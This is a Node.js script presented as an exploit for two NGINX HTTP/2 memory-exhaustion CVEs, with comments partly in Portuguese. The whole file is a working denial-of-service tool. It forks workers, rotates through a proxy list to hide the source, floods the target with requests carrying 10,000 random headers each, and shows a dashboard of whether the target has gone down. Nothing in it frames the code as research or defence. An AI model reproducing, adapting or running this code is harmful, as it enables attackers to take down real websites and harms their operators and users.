#!/usr/bin/env node

/**
 * http2-dos-cve.js - Exploit for CVE-2024-7347 and CVE-2025-23419
 * Targets NGINX HTTP/2 servers vulnerable to memory exhaustion.
 * 
 * Usage: node http2-dos-cve.js <target> <duration> <rate> <threads> [proxyfile]
 * Example: node http2-dos-cve.js https://example.com 30 100 4 proxy.txt
 */

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');

process.setMaxListeners(0);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 5) {
    console.log(`
┌─────────────────────────────────────────────────────────┐
│ HTTP/2 DoS Exploit - CVE-2024-7347 / CVE-2025-23419      │
├─────────────────────────────────────────────────────────┤
│ Usage: node http2-dos-cve.js <target> <duration> <rate> <threads> [proxyfile] │
│ Example: node http2-dos-cve.js https://example.com 30 100 4 proxy.txt │
└─────────────────────────────────────────────────────────┘
`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6] || 'proxy.txt'
};

const parsedTarget = url.parse(args.target);
const proxies = fs.existsSync(args.proxyFile) ? fs.readFileSync(args.proxyFile, 'utf-8').split(/\r?\n/).filter(l => l.trim() && l.includes(':')) : [];

// Gera um grande número de cabeçalhos (10000) para esgotar a tabela HPACK e consumir memória
function generateMaliciousHeaders() {
    const headers = {
        ':method': 'GET',
        ':path': parsedTarget.path || '/',
        ':scheme': 'https',
        ':authority': parsedTarget.hostname,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'accept': '*/*',
    };
    // Adiciona 10000 cabeçalhos com nomes aleatórios para forçar alocação de memória
    for (let i = 0; i < 10000; i++) {
        const key = `x-header-${i}`;
        const value = crypto.randomBytes(8).toString('hex');
        headers[key] = value;
    }
    return headers;
}

if (cluster.isMaster) {
    let totalSent = 0;
    let targetStatus = '🟢 ONLINE';
    let targetIp = 'Resolvendo...';

    const dns = require('dns');
    dns.lookup(parsedTarget.hostname, (err, addr) => { if (!err) targetIp = addr; });

    // Verificação simples de status
    function checkStatus() {
        const http = require('http');
        const https = require('https');
        const req = (parsedTarget.protocol === 'https:' ? https : http).request({
            hostname: parsedTarget.hostname,
            port: parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80),
            path: '/',
            method: 'HEAD',
            timeout: 3000
        }, (res) => {
            targetStatus = res.statusCode < 500 ? '🟢 ONLINE' : '🔴 DOWN';
        });
        req.on('error', () => { targetStatus = '🔴 DOWN'; });
        req.end();
    }
    setInterval(checkStatus, 5000);
    setTimeout(checkStatus, 1000);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setInterval(() => {
        console.clear();
        console.log(`
┌─────────────────────────────────────────────────────────┐
│ HTTP/2 DoS Exploit - CVE-2024-7347 / CVE-2025-23419      │
├─────────────────────────────────────────────────────────┤
│ TARGET: ${parsedTarget.hostname} (${targetIp})                │
│ DURATION: ${args.time}s   RATE: ${args.rate}/s   THREADS: ${args.threads} │
│ STATUS: ${targetStatus}                                      │
│ TOTAL REQUESTS SENT: ${totalSent.toLocaleString()}           │
│ PROXIES LOADED: ${proxies.length}                            │
└─────────────────────────────────────────────────────────┘
`);
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'stats') {
            totalSent += msg.count;
        }
    });

    setTimeout(() => {
        console.clear();
        console.log(`
┌─────────────────────────────────────────────────────────┐
│ ATTACK FINISHED                                         │
├─────────────────────────────────────────────────────────┤
│ TOTAL REQUESTS: ${totalSent.toLocaleString()}              │
│ FINAL TARGET STATUS: ${targetStatus}                     │
└─────────────────────────────────────────────────────────┘
`);
        process.exit(0);
    }, args.time * 1000);

} else {
    // Worker – ataque
    let workerCount = 0;

    // Envia estatísticas a cada 1 segundo
    setInterval(() => {
        if (workerCount > 0) {
            process.send({ type: 'stats', count: workerCount });
            workerCount = 0;
        }
    }, 1000);

    // Função para conectar e enviar requisições maliciosas
    function runFlooder() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
        let socket;
        let tlsSocket;
        let client;

        const connect = () => {
            if (proxy) {
                const [host, port] = proxy.split(':');
                socket = net.createConnection({ host, port: parseInt(port) });
                socket.once('connect', () => {
                    socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
                });
                socket.once('data', (data) => {
                    if (!data.toString().includes('200')) {
                        socket.destroy();
                        return setTimeout(connect, 2000);
                    }
                    tlsSocket = tls.connect({
                        socket,
                        servername: parsedTarget.hostname,
                        ALPNProtocols: ['h2'],
                        rejectUnauthorized: false
                    }, () => {
                        startClient();
                    });
                    tlsSocket.on('error', () => {
                        socket.destroy();
                        setTimeout(connect, 2000);
                    });
                });
                socket.on('error', () => {
                    socket.destroy();
                    setTimeout(connect, 2000);
                });
            } else {
                // Conexão direta sem proxy
                tlsSocket = tls.connect({
                    host: parsedTarget.hostname,
                    port: 443,
                    servername: parsedTarget.hostname,
                    ALPNProtocols: ['h2'],
                    rejectUnauthorized: false
                }, () => {
                    startClient();
                });
                tlsSocket.on('error', () => {
                    setTimeout(connect, 2000);
                });
            }
        };

        function startClient() {
            client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsSocket,
                settings: {
                    initialWindowSize: 1073741824,
                    maxConcurrentStreams: 1000
                }
            });

            client.on('connect', () => {
                // Envia requisições na taxa definida
                const interval = setInterval(() => {
                    if (!client || client.destroyed) {
                        clearInterval(interval);
                        return;
                    }
                    for (let i = 0; i < args.rate; i++) {
                        const headers = generateMaliciousHeaders();
                        const req = client.request(headers);
                        req.on('response', () => {
                            workerCount++;
                            req.close();
                            req.destroy();
                        });
                        req.on('error', () => {
                            req.close();
                            req.destroy();
                        });
                        req.end();
                    }
                }, 1000);
            });

            client.on('error', () => {
                client.destroy();
                tlsSocket.destroy();
                setTimeout(connect, 2000);
            });
        }

        connect();
    }

    // Inicia múltiplos flooders por worker
    for (let i = 0; i < 10; i++) {
        setTimeout(runFlooder, i * 100);
    }
}
